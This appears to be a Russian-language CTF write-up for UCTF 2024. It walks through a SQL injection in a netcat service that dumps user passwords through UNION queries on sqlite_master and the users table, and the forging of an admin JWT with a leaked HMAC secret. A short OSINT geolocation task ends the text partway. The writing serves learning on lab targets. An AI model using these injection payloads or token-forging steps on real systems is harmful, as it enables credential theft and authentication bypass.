# uctf24-wrtup

## Z00k33p3r [easy]
_Category:_ pwn

_Description:_
Welcome to the Z'OO `nc gmcher.ru 14009`


При обращении к заданию с помощью `nc` получим ответ:
```
Welcome!
Menu:
up - Sign up
in - Sign in
search - Facts
joke - Joke
exit – Exit
```

После регистрации через меню `Sign in` и входа через меню `Sign up` мы получим доступ к меню `search` и `jokes`. Меню `jokes` не имеет для нас смысла, нас должно заинтересовать меню `search`, потому что оно подразумевает ввод текста.
Введя в поле ' мы должны будем обратить внимание на возникшую ошибку, что должно навести нас на мысль на отсутствующую проверку данных. Попытаемся ввести простейшую SQL-инъекцию вида `' or 1=1; --`:
```
Enter animal name: ' or 1=1; --

Elephants are the largest land animals on Earth.
Blue whales are the largest animals on Earth. Their hearts can weigh as much as an automobile.
Giraffes only need to drink once every few days. Most of their water comes from the plants they eat.
Lions are the only cats that live in groups, called prides.
Tigers are the largest wild cats in the world.
Polar bears have black skin and although their fur appears white, it is actually transparent.
Koalas sleep for up to 18 hours a day.
Kangaroos can't walk or move their hind legs independently of each other.
Every zebra has a unique pattern of black and white stripes.
Penguins are birds, but they cannot fly. They are excellent swimmers instead.
Octopuses have three hearts.
Cheetahs are the fastest land animal, reaching speeds up to 70 miles per hour.
Crocodiles have a powerful bite but cannot chew. They swallow their food whole.
Leopards can carry their prey up into the trees to keep it away from scavengers like hyenas.
```

Дальше нам необходимо понять какая база данных используется в задании. Воспользовавшись стандартным запросом к таблице information_schema мы получим ошибку. Попробуем следующее:
```
Enter animal name: ' union select name from sqlite_master where type='table'; --
facts
users
```

Таким образом мы поняли что используется бд sqlite и в ней на данный момент содержится две таблицы `facts` и `users`.

Если мы попытаемся объединить вывод как есть, то получим ошибку о том, что количество столбцов не совпадает. Можно предположить, что в таблице `facts`, с которой мы будем соединять наши запросы количество полей меньше, чем в таблице `users`, и тогда придется немного изменить запрос, сократив выводимый столбец до одного:
```
Enter animal name:  ' union select password from users --
!QwQUwUOwO!
ExecMakesShiffSniff12
Krut0g3d0nRul35!
MaPassword123!
Th1515V3ryStr0nGP@ssw0rd4Adm1n!1!
```

Дальше необходимо войти под администратором и появится новый вариант меню - `flag`, где мы его и получим.

## AUTH! [easy]

_Category:_ web

_Description:_
GUUUYS, i saw her secret!!!

`3cf2aa4a8a5180a39b7931fe4cf619f2bae417a7d77dda90c323d85f931c6821`

P.S. first of all, it's API

Для подключения: `https://auth.uctf.xotohop.tech/`

_Для общей информации:_ JSON Web Token (JWT) — это специальный формат токена, который позволяет безопасно передавать данные между клиентом и сервером.
Структура JWT состоит из трёх частей, которые разделены точкой: 
* Header (заголовок) — информация о токене, тип токена и алгоритм шифрования. 
* Payload (полезные данные) — данные, которые нужно передать в токене. Например, имя пользователя, его роль, истекает ли токен. Эти данные представлены в виде JSON-объекта. 
* Signature (подпись) — вычисляется на основании первых двух частей и зависит от выбранного алгоритма. В случае использования неподписанного JWT может быть опущен.

Обычно JWT token отправляется в заголовке вида `Authentication: Bearer {token}`, но в данном задании можно заметить, что никаких header-ов в приложение на направляется, а значит JWT-токен используется в самописном решении для аутентификации и, возможно, его хранение и валидация осуществляются как-то иначе, чем обычно. JWT-токен будет действительно безопасным средством аутентификации и авторизации только в случае корректной реализации механизма его работы. 

Начнем с простого обращения:
```
r = requests.get("https://auth.uctf.xotohop.tech/")
print(f"{r.status_code}: {r.text}")

>>> 200: {"welcome":[{"/login":"to login"},{"/register":"to registrate"},{"/flag":"to get flag"}],"P.S.":"U have no chance against my authenitication!"}
```

Отправив GET-запрос на указанные эндпоинты получим уведомление `405 - Method not allowed`. Попробуем сделать POST-запрос и получим уведомление о необходимости добавить `username` и `password`. Отправить payload в формате json не получится, приложение его не примет. В таком случае попробуем использовать отправку параметров через URL.

```
r = requests.post("https://auth.uctf.xotohop.tech/register?username=MrP3lm3sh&password=P@ssw0rd")
print(f"{r.status_code}: {r.text}")

>>> 200: {"registration":{"status":"Success"}}
```

Войдем в приложение:
```
r = requests.post("https://auth.uctf.xotohop.tech/login?username=MrP3lm3sh&password=P@ssw0rd")
print(f"{r.status_code}: {r.text}")

>>> 200: {"login":{"status":"Success","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ik1yUDNsbTNzaCJ9.Acp4r7_n6gFs4thcAXyJi3HvIBk_ubPYao_eCqs-tUQ"}}
```

Обратим внимание, что мы получили токен после входа. Попытавшись добавить этот токен к заголовку `Authentication: Bearer {token}` мы не получим никакого результата, однако `token` все равно будет требоваться. Попробуем подставить его также, как в предыдущие запросы:
```
my_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ik1yUDNsbTNzaCJ9.Acp4r7_n6gFs4thcAXyJi3HvIBk_ubPYao_eCqs-tUQ"
r = requests.post(f"https://auth.uctf.xotohop.tech/flag?token={my_token}")
print(f"{r.status_code}: {r.text}")

>>> 200: {"get flag":{"status":"U are not admin >:0","flag":"No flag for u loser"}}
```

Попытаемся поискать способ обойти ограничение: похоже, что нам нужно сделать запрос как администратору. Если мы попытаемся использовать SQL-инъекцию, то приложение не отреагирует на специальные символы, но мы поняли, что разграничение осуществляется по токену, а в описании задания нам предоставили `secret`. Попробуем проверить наш токен и секрет с помощью jwt.io:

![image](https://github.com/user-attachments/assets/82b2a99d-cd42-4650-98a3-5b0f52758ea8)

Похоже, что секрет валидный и с помощью него мы можем подписать свой собственный токен. Для этого нам нужно посмотреть на содержимое нашего токена: в нем находится только поле `username`, алгоритм указан в заголовке. Так как при попытке регистрации и вводе имени `admin` мы получим информацию о том, что такой пользователь уже существует, то давайте попробуем подделать его jwt-токен:
```
data = {"username": "admin"}
SECRET_KEY = "3cf2aa4a8a5180a39b7931fe4cf619f2bae417a7d77dda90c323d85f931c6821"
ALGORITHM = "HS256"
encoded_jwt = jwt.encode(data, SECRET_KEY, algorithm=ALGORITHM)

r = requests.post(f"https://auth.uctf.xotohop.tech/flag?token={encoded_jwt}", )
print(f"{r.status_code}: {r.text}")

>>> 200: {"get flag":{"status":"Welcome, admin!","flag":"UCTF{DO IT BY YOURSELF}"}}
```

## 80+3+79+57+1+36+94 [easy]

_Category:_ osint

_Description:_
Едем кушац! >~<

Картинка: `https://disk.yandex.ru/i/A5Ics2dVVPe4PA`

Флаг в формате UCTF{название ресторана (без нижних подчеркиваний)}

Название задания важно!

В задании мы получили ссылку на фотографию с вопросом в названии `whereami`:

![image](https://github.com/user-attachments/assets/1fd5d8a6-e603-4128-8e0c-64d68700aad3)

С помощью этой фотографии можно отследить геопозицию где была сделана эта фотография - Невский проспект.
![image](https://github.com/user-attachments/assets/4fb91452-0242-4486-9e0f-b19234df25c2)

Нас предупредили, что название задания важно, поэтому давайте сложим цифры задания - 350.

От нас ждут название ресторана. Давайте попробуем использовать навыки, которые требует osint - умение пользоваться Интернетом.

![image](https://github.com/user-attachments/assets/282a6918-e9ed-4ef2-aae2-2c70f96e18a2)
